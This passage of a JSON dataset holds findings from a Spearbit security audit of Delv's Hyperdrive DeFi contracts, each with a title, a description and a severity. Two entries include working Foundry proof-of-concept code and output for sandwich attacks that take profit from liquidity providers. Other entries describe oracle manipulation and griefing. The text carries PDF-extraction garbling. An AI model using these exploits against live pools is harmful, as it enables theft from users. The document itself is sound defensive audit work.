        "title": "totalSupply / balances accounting invariant will break on transfers to address(0) and address(this)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The code is trying to use a certain trick to revert on transfers to address(0) and address(this) (a common check to avoid locking assets by error) by setting the balanceOf of these addresses to the max value, which after adding any value > 0 should revert. // By setting these addresses to the max uint256, attempting to execute // a transfer to either of them will revert. This is a gas-efficient way // to prevent a common user mistake where they transfer to the token // address. These values are not considered // included in total supply // WARN - Never allow allowances to be set for these addresses. balanceOf[address(0)] = type(uint256).max; balanceOf[address(this)] = type(uint256).max; real which only contains minted tokens. tokens and so are not     While this would hold in a common scenario with pragma version (cid:2)0.8, the code is using a gas optimized ERC20 library, anmely Solmate, whose transfer and _mint use unchecked blocks. Incrementing within the unchecked block will lead to overflow, breaking thus the relation between totalSupply and the sum of all balances' accounting when calling _mint() or transfer: // Cannot overflow because the sum of all user // balances can unchecked { t exceed the max uint256 value.  balanceOf[to] += amount; } Additionally, it breaks the balances invatiant ( sum of all balances <= totalSupply) that the code should hold, by setting these values to max value. In example, consider this case (for simplicity all with initial values):  Initial balanceOf[0] = type(uint256).max.  Call to _mint() (which can be accomplished by calling mint to address(0) with amount 2 and to equal to address(0).  Expected behavior as per comments ! revert. The real result is:  Expected totalSupply = 2.  balanceOf[0] = 1 while it should be balanceOf[0] == 2 if this wasn't set to type(uint256).max.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "calculateSpotPrice(...) should not use _normalizedTimeRemaining",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When one trades on the curve, the following share-bond curve is used (with fixed ts): c ((cid:22)z)1(cid:0)ts + y 1(cid:0)ts = k (cid:22) If one calculates the spot price which is the slope of the perpendicular line to the tangent of the curve at a point like (z, y ) we would get: dz (cid:0)dy = ts 1 c (cid:22)z y Instead in calculateSpotPrice(...) the spot price is calculated as: There are two issues where the first is more important: dz (cid:0)dy = tr ts (cid:22)z y 1 c 1. The factor is not considered. This is due to a wrong NatSpec comment that mentions calculateSpot- Price(...) calculates the spot price without slippage of bonds in terms of shares, but it should be the spot price of bonds in terms of the base. 2. tr or _normalizedTimeRemaining does not have a concrete meaning since it is not used in the definition of the curve, but one can apply it to manipulate the price which will be used in fee calculations. But again those fee calculations should not consider the tr in the exponent when calculating fees for non-matured positions. The spot price is recorded for oracles and is also used in LP and governance fee calculations.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Curve part is not reduced by negative variable interest growth when closing longs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When closing longs during a period of negative interest, the trader's proceeds are reduced propor- tionally to the negative growth. However, this is only done on the shareProceeds variable which represents both flat and curve parts, the curve part shareReservesDelta is not reduced by this amount but it should be. It also checks the negative interest region compared to the beginning of the deployment (_initialSharePrice) instead of the beginning of opening the longs (_openSharePrice).",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Removing liquidity does not reduce the shares received by the overestimated amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When redeeming liquidity leads to negative withdrawal shares and the share proceeds are adjusted again, the overestimatedProceeds that are treated as contributing to withdrawal shares are still paid out to the LP.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Sandwich a call to addLiquidity(...) for profit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When a user opens a short position the lower bound for the updated z is . So in an absence of long outstanding positions or if L0 is really small, a user can open a short position such that it would move z really close to 0. This will cause if at a later point, flat trade is being applied small positive change in z can cause a really big change in y . These flat trades (with a scale factor bigger than 1) basically scale our point for a factor and they happen when: L0 c 1. A checkpoint is applied to close an outstanding short position of a certain maturity (see the issue [drain-pool- by-sandwiching-matured-shorts]\"Drain pool by sandwiching matured shorts\"). 2. A liquidity provider calls addLiquidity(...). Here is how the attack is performed when a liquidity provider wants to contribute to the LP: 1. The attacker frontruns the next step and opens a short with a maximum possible bond amount such that the solvency requirement is met ( z (cid:21) would be really small. L0 c ) but moves the point (z, y) close to the y-axis such that the value of z 2. The liquidity provider calls addLiquidity(...) which kicks off the current (z, y ) point far from the origin and also scales up the current curve. 3. The attacker backruns the previous transaction and closes its short position for profit. The liquidity provider can try to prevent such attacks by providing a max APR value to the addLiquidity(...). But the attacker can also use this as a griefing attack. Proof of Concept // file: test/units/hyperdrive/AddLiquiditySandwichAttack.t.sol // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; uint256 apr = 0.01e18; uint256 initContribution = 1_000_000e18; uint256 aliceAddLiquidityContrib = 100_000e18; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); 20 } function _printPrice(uint256 start) internal view { uint256 checkpointId = hyperdrive.latestCheckpoint(); IHyperdrive.Checkpoint memory checkpoint = hyperdrive.getCheckpoint(checkpointId); console2.log(\"[dt, c]: [%s days, %s]\", (checkpointId - start)/ (1 days), checkpoint.sharePrice); } function _printPrice(uint256 checkpointId, uint256 start) internal view { IHyperdrive.Checkpoint memory checkpoint = hyperdrive.getCheckpoint(checkpointId); console2.log(\"[dt, c]: [%s days, %s]\", (checkpointId - start)/ (1 days), checkpoint.sharePrice); } function _calculateTimeRemainingScaled( uint256 _maturityTime ) internal view returns (uint256 timeRemaining) { IHyperdrive.PoolConfig memory poolConfig = hyperdrive.getPoolConfig(); uint256 latestCheckpoint = hyperdrive.latestCheckpoint() * FixedPointMath.ONE_18; timeRemaining = _maturityTime > latestCheckpoint ? _maturityTime - latestCheckpoint : 0; timeRemaining = (timeRemaining).divDown( poolConfig.positionDuration * FixedPointMath.ONE_18 ); } function _printPoolInfo() internal view { IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); IHyperdrive.PoolConfig memory poolConfig = hyperdrive.getPoolConfig(); uint256 start = hyperdrive.latestCheckpoint(); _printPrice(start); uint256 _apr = HyperdriveMath.calculateAPRFromReserves( poolInfo.shareReserves, poolInfo.bondReserves, poolConfig.initialSharePrice, poolConfig.positionDuration, poolConfig.timeStretch ); uint256 presentValue = HyperdriveUtils.presentValue(hyperdrive); HyperdriveMath.PresentValueParams memory params = HyperdriveMath .PresentValueParams({ shareReserves: poolInfo.shareReserves.add(aliceAddLiquidityContrib), bondReserves: ,! ,! poolInfo.shareReserves.add(aliceAddLiquidityContrib).mulDivDown(poolInfo.bondReserves, poolInfo.shareReserves), sharePrice: poolInfo.sharePrice, initialSharePrice: poolConfig.initialSharePrice, timeStretch: poolConfig.timeStretch, longsOutstanding: poolInfo.longsOutstanding, longAverageTimeRemaining: _calculateTimeRemainingScaled( poolInfo.longAverageMaturityTime ), shortsOutstanding: poolInfo.shortsOutstanding, shortAverageTimeRemaining: _calculateTimeRemainingScaled( poolInfo.shortAverageMaturityTime ), shortBaseVolume: poolInfo.shortBaseVolume }); 21 uint256 endingPresentValue = HyperdriveMath.calculatePresentValue( params ); console2.log(\"[z, y, s] = [%s, %s, %s]\", poolInfo.shareReserves / 1e18, poolInfo.bondReserves / ,! 1e18 , poolInfo.lpTotalSupply / 1e18); console2.log(\"[L_0, S_0]: [%s, %s]\\n\", poolInfo.longsOutstanding / 1e18, ,! poolInfo.shortsOutstanding / 1e18); console2.log(\"apr: %s%\", _apr / 1e16); console2.log(\"[Pv0, Pv1]: [%s, %s]\\n\", presentValue / 1e18, endingPresentValue / 1e18); console2.log(\"approx %s\", ,! poolInfo.shareReserves.add(100_00e18).mulDivDown(poolInfo.bondReserves, poolInfo.shareReserves)); uint256 cDivMu = poolInfo.sharePrice.divDown(poolConfig.initialSharePrice); uint256 k = YieldSpaceMath.modifiedYieldSpaceConstant( cDivMu, poolConfig.initialSharePrice, poolInfo.shareReserves, FixedPointMath.ONE_18.sub(poolConfig.timeStretch), poolInfo.bondReserves ); uint256 TWO_18 = 2e18; uint256 zop = k.divDown( FixedPointMath.ONE_18.add( TWO_18.pow(127 * FixedPointMath.ONE_18.sub(poolConfig.timeStretch)) ) ).pow( FixedPointMath.ONE_18.divDown( FixedPointMath.ONE_18.sub(poolConfig.timeStretch) ) ); console2.log(\"[k, zop]: [%s, %s]\", k / 1e18, zop); } function test_sandwich_add_liquidity() external { uint256 start = hyperdrive.latestCheckpoint(); console2.log(\"\\n---[ before LP init ]---\\n\"); _printPrice(start); initialize(alice, apr, initContribution); IHyperdrive.PoolConfig memory poolConfig = hyperdrive.getPoolConfig(); console2.log(\"time stretch: %s \\n\", poolConfig.timeStretch); console2.log(\"\\n---[ after LP init ]---\\n\"); _printPoolInfo(); console2.log(\"max short %s\", hyperdrive.calculateMaxShort()); // 0. attacker opens a max possible short // hyperdrive.calculateMaxShort() uint256 bondAmountSandwich = 1_059_000_000_000e12; (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, bondAmountSandwich, 1_073_136_914_215_316_494_666_769 ,! true); 22 console2.log(\"\\n---[ after sandwich open short ]---\\n\"); console2.log(\"%s %s\\n\", bondAmountSandwich / 1e18, bondAmountSandwich); console2.log(\"[dy, dx]: [%s, %s]\", bondAmountSandwich / 1e18, baseAmountSandwich / 1e18); _printPoolInfo(); // 1. Alice adds some LP liquidity // This will cause the (z,y) point to be kicked far from its current position // even when a small amount of liquidity is added. uint256 lpShares = addLiquidity(alice, aliceAddLiquidityContrib); console2.log(\"\\n---[ after Alice adds liquidity ]---\\n\"); console2.log(\"[dy, dx]: [%s, %s]\", lpShares / 1e18, lpShares / 1e18); _printPoolInfo(); // 2. attacker now closes their shorts for a profit uint256 baseProceeds = closeShort(bob, maturityTimeSandwich, bondAmountSandwich); console2.log(\"\\n---[ after sandwich close short ]---\\n\"); console2.log(\"[dx1, ROI | dx1/dx0]: [%s, %s%]\", baseProceeds / 1e18, baseProceeds * 1e2 / ,! baseAmountSandwich); _printPoolInfo(); } }  Output ---[ before LP init ]--- [dt, c]: [0 days, 0] time stretch: 44463125629060298 ---[ after LP init ]--- [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [1000000, 1250806, 1000000] [L_0, S_0]: [0, 0] apr: 0% [Pv0, Pv1]: [1000000, 1100000] approx 1263314358717398521160000 [k, zop]: [1211053, 0] max short 1073136914215316494666769 ---[ after sandwich open short ]--- 1059000 1059000000000000000000000 [dy, dx]: [1059000, 69632] [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [10632, 2309806, 1000000] [L_0, S_0]: [0, 1059000] apr: 27% [Pv0, Pv1]: [1000000, 1001460] approx 4482207926544039548715043 [k, zop]: [1211053, 0] about to calc lpShares [Pv0, Pv1, s]: [1000000000000000004901357, 1001460909298379346874428, ,! 1000000000000000000000000] 23 finished calc lpShares ---[ after Alice adds liquidity ]--- [dy, dx]: [1001460, 1001460] [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [110632, 24033822, 1001460] [L_0, S_0]: [0, 1059000] apr: 27% [Pv0, Pv1]: [1001460, 1083766] approx 26206224234386429875865475 [k, zop]: [11354827, 0] ---[ after sandwich close short ]--- [dx1, ROI | dx1/dx0]: [168171, 241%] [dt, c]: [0 days, 1000000000000000000] [z, y, s] = [1001460, 22974822, 1001460] [L_0, S_0]: [0, 0] apr: 14% [Pv0, Pv1]: [1001460, 1101460] approx 23204235677944735935087436 [k, zop]: [11354827, 0]",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Sandwiching removeLiquidity can steal profits from LP",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "During remove liquidity, an LP specifies a slippage parameter called _minOutput. This slippage parameter is used for the baseProceeds, proceeds that are released immediately. Unfortunately, no slippage parameter is defined for the withdrawalShares, which are proceeds that are minted for the LP and that can be redeemed afterwards. This opens an opportunity for an attacker to generate a sandwich attack that passes the slippage check on the baseProceeds but renders less withdrawalShares for the LP. The withdrawal shares can later be redeemed for profit for the attacker. In the following proof of concept, Bob manages to sandwich Alice on LP removing but adding liquidity and removing it, generating profit that he can redeem once more liquidity is available for withdrawal via withdrawalProceeds. Proof of Concept function test_sandwich_withdrawal_shares() external { uint256 apr = 0.05e18; // Alice initializes the pool with a large amount of capital. uint256 contribution = 100e18; uint256 lpShareAlice = initialize(alice, apr, contribution); 24 console2.log(\"[alice] lpShareAlice \", lpShareAlice); // Dan opens a long vm.prank(dan); (uint256 matTime, uint256 bonds) = openLong(dan, 1e18); // Time passes and interest accrues. uint256 timeAdvanced = POSITION_DURATION.mulDown(0.5e18); advanceTime(timeAdvanced, int256(apr)); // Bob initializes the sandwich attack, adds high liquidity vm.prank(bob); uint256 bobShares = addLiquidity(bob, 100_000e18); // Alice removes the liquidity (mempool) (uint256 baseProceeds, uint256 withdrawalShares) = removeLiquidity( alice, lpShareAlice ); console2.log(\"[alice] BaseProceeds\", baseProceeds); console2.log(\"[alice] withdrawalShares\", withdrawalShares); // Bob removes the liquidity vm.prank(bob); (uint256 proceedsBob, uint256 withdrawalSharesBob) = removeLiquidity( bob, bobShares ); console2.log(\"[bob] proceedsBob\", proceedsBob); console2.log(\"[bob] withdrawalSharesBob\", withdrawalSharesBob); // Dan closes a long to, this helps Bob to redeem the withdrawalShares vm.prank(dan); uint256 baseAmountReceivedByDan = closeLong(dan, matTime, bonds); console2.log(\"[dan] baseAmountReceivedByDan \", baseAmountReceivedByDan); // Bob redeems the withdrawal shares from his sandwich attack ( uint256 baseProceedsRedeemBob, uint256 sharesRedeemedBob ) = redeemWithdrawalShares(bob, withdrawalSharesBob); console2.log(\"[bob] baseProceedsRedeemBob\", baseProceedsRedeemBob); console2.log(\"[bob] sharesRedeemedBob\", sharesRedeemedBob); // Alice redeems the withdrawal shares ( uint256 baseProceedsRedeem, uint256 sharesRedeemed ) = redeemWithdrawalShares(alice, withdrawalShares); console2.log(\"[alice] baseProceedsRedeem\", baseProceedsRedeem); console2.log(\"[alice] sharesRedeemed\", sharesRedeemed); console2.log(\"[alice] base token balance \", baseToken.balanceOf(alice)); console2.log(\"[bob] base token balance \", baseToken.balanceOf(bob)); }  Results 25   Bob s initial balance 100000000000000000000000 Profit that Alice should take 2539793409391399511 Alice ,! Bob 2531976296354487525 s  s balance after the sandwich and redeem 102531976296354487525 <= Alice receives balance after the sandwich 100000007817113036911986 <= Bob profits 7817113036911986",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LP funds can be locked up cheaply at low-interest rates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Opening shorts can be seen as LPs providing the base part of the bonds at the current price and traders paying only the implied fixed interest part on them. The LP funds are locked up (technically removed from the reserves until the shorts are closed) and LP shares cannot directly be redeemed for the base asset anymore, only for withdrawal shares that are slowly converted as LPs receive their proceeds. The ratio of trader funds paid and LP funds locked up is especially large when the fixed interest rate is low. This allows a griefing attack where a large percentage of LP funds can be locked up by opening shorts at low- interest rates. This can also happen naturally when circumstances in the underlying protocol lead to many shorts being opened.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Strict initialSharePrice checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The ERC4626Hyperdrive and StethHyperdrive constructors check that the provided initial- SharePrice exactly matches the current share price of the yield source: uint256 shareEstimate = _pool.convertToShares(FixedPointMath.ONE_18); if ( _config.initialSharePrice != FixedPointMath.ONE_18.divDown(shareEstimate) revert Errors.InvalidInitialSharePrice(); ) { } It's easy for the deployment to revert here because estimating the exact share price when the transaction is mined is very hard as the yield sources can accrue new interest every block. Furthermore, the share price of the yield source can usually be manipulated by donating to the vault which allows an attacker to frontrun the deployment with a tiny donation such that the strict equality check fails.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Wrong flat fee when opening longs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When opening longs there should be no flat fee as all newly minted bonds have a maturity time of periodDuration and must therefore be purchased on the curve part of the flat+curve model. When open- ing longs, updateLiquidity(_baseAmount.divDown(_sharePrice) - _shareReservesDelta) is called where _- baseAmount.divDown(_sharePrice) - _shareReservesDelta is the flat part that is supposed to be 0. However, _baseAmount is set to _baseAmount - totalGovernanceFee when calling _applyOpenLong which is the difference of a base amount and a share amount. The different units can't be subtracted and the mentioned reserves update will not be zero.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unsafe type-casts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Unsafe type-casts are performed throughout the contracts.  HyperdriveLong.sol#L259  HyperdriveLong.sol#L321  HyperdriveLP.sol#L157  HyperdriveLP.sol#L320-L321  HyperdriveLP.sol#L352  HyperdriveLP.sol#L418  HyperdriveLP.sol#L418-L441  HyperdriveLP.sol#L532-L536  HyperdriveShort.sol#L360  FixedPointMath.sol#L145  HyperdriveMath.sol#L388-L389  HyperdriveMath.sol#L477-L484",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "query's returned price is not accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The query(uint256 period) function is supposed to return \"the average price between the last recorded timestamp looking a user-determined time into the past\". The user-determined time is the period pa- rameter. However, the code looks for the next checkpoint which is period seconds before the last checkpoint. It then just averages these two checkpoints, disregarding the period, meaning the resulting price can have a \"time window error\" up to the oracle's _updateGap. If the oracle's _updateGap is large (which it probably is to save gas) the TWAP might not really represent the TWAP over period seconds from the last checkpoint. Example:  t = 0, sum = 1e18  t = 100, sum = 2e18  t = 200, sum = 4e18 With a period = 101, query will look at t = 0 and t = 200, and compute (4e18 - 1e18) / (200) = 1.5e16 but the more accurate value would be much closer to (4e18 - 2e18) / (200 - 100) = 2e16 as only a single second of the period lookback should come from the 0 -> 100 time window with slower growth. It will return the same averaged price for period = 101 and period = 200 even though these have very different averages. I'd expect query to return the average price from (block.timestamp - period,",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Late checkpoints will use higher share price, influencing traders' PnL",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Calling the checkpoint(_checkpointTime) function for a checkpoint in the past will look for the next checkpoint higher than _checkpointTime, then retroactively apply the later checkpoint's share price to it:  Under normal circumstances, the earlier checkpoint would have a smaller share price (as the yield source has generated less interest up to this point).  This closes longs/shorts at the higher share price. For example, in calculateCloseLong, the trader would receive fewer shareProceeds. The protocol essentially stops accruing interest for the trader's long position upon maturity. When closing shorts, this can influence both the openSharePrice and closeSharePrice in closeShort and lead to losses/profits compared to closing them directly at maturity.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Updating the factory's implementation will still deploy old data provider",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "While one can set a new deployer in the factories and therefore a new Hyperdrive version, one can't actually change the data provider and it's likely that a new Hyperdrive version will require a new data provider. The reason is that the yield-source-specific deployer is not responsible for deploying the data provider, the yield- source-specific factory is responsible for deploying the data provider.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Not using safe version of ERC20 transfer/transferFrom/approve can lead to wrong scenarios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Some tokens (like ZRX) do not revert the transaction when the transfer/transferFrom fails and return false, which requires us to check the return value after calling the transfer/transferFrom function. While the code checks for the return value in all other instances of transfer and transferFrom:  HyperdriveFactory.sol#L205 Additionally note that some ERC20 tokens don't have any return value, for example USDT, BNB, OMG. This will make the expected return value to fail if these tokens are used on the if (!success) revert pattern, which is the predominant case on the code, making these tokens not compatible as base tokens. Assuming aToken is set to correct address, aToken case can avoid the check as it's known to revert on fail transfer, and therefore not included in the context files. The AaveHyperdrive contract sets ERC20 approvals by calling token.approve(operator, amount). This comes with several issues: 1. ERC20.approve returns a success boolean that is not checked. Some tokens don't revert and return false instead. 2. Non-standard tokens like USDT return no data at all but the IERC20.approve interface expects the call to return data and attempts to decode it into a boolean. The approval calls will fail for USDT. 3. Non-standard tokens like USDT require approvals to be reset to zero first before being able to set them to a different non-zero value again. approve instances:  ERC4626Hyperdrive.sol#L51  DsrHyperdrive.sol#L52  AaveHyperdrive.sol#L45  HyperdriveFactory.sol#L210",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk HyperdriveFactory.sol#L205,"
        ]
    },
    {
        "title": "Flat fees take portions of both the interest and the principal investement",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": " Curve Fees The curve fees are calculated as the fc portion of potential future interest at the end of a full term given the current point (z, y ) on the curve. It's important that the fees are only taken from the interest portion of the future value and not the mix of present value plus the future interest (predicted future value).  Flat Fees On the other hand when one is closing its short or long position the flat fee is calculated as: (1 (cid:0) tr ) kdy k ff c which is the ff portion of the full matured amount (invested amount plus the interest). We should also only apply fees to the interest portion like how curve fees are calculated (that would mean using the r 0 1 + r 0 component)? For example in an extreme case where the annualised interest rate is almost 0, a person who closes a matured position pay portion of their investment as the flat fee even though the interest would be almost 0 (see LP and Governance Fees).",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "checkpoint(...) in some rare cases can run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "If we end up in the for loop in this context and if we try to:  Apply a checkpoint for a time in the past that.  From that time to the latest checkpoint there has not been an update (call to _applyCheckpoint) and if...  ...the current price per share is 0 (_pricePerShare) (unlikely but if). We run into an infinite loop which will cause an out-of-gas error.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DsrHyperdriveDataProvider's _pricePerShare() is missing a 0 check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "DsrHyperdriveDataProvider's _pricePerShare() is missing a 0 check for _totalShares which is used as the denominator of the fraction: return (totalBase.divDown(_totalShares)); This also does not match with the implementation of the same endpoint in DsrHyperdrive: uint256 totalShares_ = totalShares; if (totalShares_ != 0) { return (totalBase.divDown(totalShares_)); } return 0;",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_burn of 0 amount can be called to poison monitoring by spamming events",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "There are no checks of not burning 0 assets at close, which can be used to spam events without affecting anything but calling sweep. The code calls _burn, which will operate with 0 amount having no effect in a += or -= operator, but the latter event emission can be used to poison the monitoring.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Minting of small values can be 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Solidity rounds down on division, meaning that the precision of some values may be lower than expected. In the code, at construction time, the value of mintPercent is enforced to be less than 10_000: if (_mintPercent >= 10000) { revert Errors.MintPercentTooHigh(); } This value is used for calculating the mintAmount which, even if the transferFrom works, for small combinations of amount and mintPercent Solidity's rounding down on division will make the value be 0, meaning that for a working transaction from the user, the minting result can still be 0, while the deposits are still incremented. 31 // Transfer from the user hyperdrive.transferFrom(assetId, msg.sender, address(this), amount); // Mint them the tokens for their deposit uint256 mintAmount = (amount * mintPercent) / 10000; _mint(destination, mintAmount); // Add this to the deposited amount deposits[destination][assetId] += amount; An easy example, knowing that _mintPercent < 10_000 would be with amount = 1.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Negative variable interest is taken from the wrong side",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When a trader goes long they trade variable interest for fixed interest. However, if the yield source produced negative interest during that time, the long trader's proceeds are reduced proportionally, even though the variable interest receiver (the LPs) should suffer it instead.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "calculateMaxLong's algorithm does not try to find the max long position accurately",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The current approach to estimate the max long uses some heuristic guesses. There are no expla- nations was why these heuristics might work. Writing down the formulas one can see that the initial guess and the subsequent guesses might not be the best choice for finding the maximum long position that does not violate the solvency requirement for outstanding open longs.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "MultiToken name and symbol cannot be set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "values can never be set, MultiTokenDataProvider.symbol(uint256 tokenId). The MultiTokenStorage contract defines a name and symbol per these read through MultiTokenDataProvider.name(uint256 tokenId) and token ID but but",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "BondWrapper with high _mintPercent can become unbacked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The BondWrapper reverts if _mintPercent >= 10000 (100%) and when closing the position via close checks that the amount received from closing the bonds is at least _mintPercent * bondAmount to ensure the bond positions of the contract are backed. However, closing longs comes with fees and it can happen that this check still fails at maturity with a valid, large _mintPercent of 9999 due to the fees. The result is that users can call sweep at maturity to close the longs without the check and when redeeming their position, they receive 99.99% of the bond amount as base, even though the contract received fewer proceeds. It's first-come-first-serve who can redeem at a higher rate until the contract balance is emptied and redemptions fail.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Division by 0 in _withdraw",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The AaveHyperdrive.withdraw function divides by 0 if the totalShares are 0 and will revert.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Rewards of underlying protocols are stuck in pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Some yield sources like Aave-V3 can pay out rewards for anyone supplying (and borrowing) tokens. The Hyperdrive pool would be eligible for these rewards with a potentially large share as all the LPs' funds are invested in them. However, there's currently no way to move the reward tokens out of the pool.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_deposits can revert if yield source hits the supply cap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Some yield sources like Aave-V3 and Lido's stETH have supply caps, or revert if the protocol is paused/frozen. The _deposit functions can revert if the supply cap is reached. Traders might not be able to open longs, open shorts, or add liquidity when the supply caps are reached. This could also interfere with the usefulness of the pools as a potential variable interest to fixed interest arbitrages might not be performed. Attacks could even abuse the supply caps and sandwich any Hyperdrive deposits by providing and removing liquidity on the yield source, such that any Hyperdrive action temporarily hits the supply cap.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TWAP oracle can be manipulated by only manipulating around the _updateGap oracle writes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The TWAP oracle only writes once every _updateGap seconds, and it writes the current spot price. This makes it cheap to manipulate as an attacker only needs to manipulate the AMM in the last transaction before the block that will record a new value. Then, in the new block, the attacker can counter-trade, ideally as the first transaction to the AMM, only costing them the fees for the manipulation. The attacker does not have to keep up the manipulation for the entire updateGap time period. This might become more severe with cross-block atomic bundles.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bucketing maturity times leads to timing swaps",
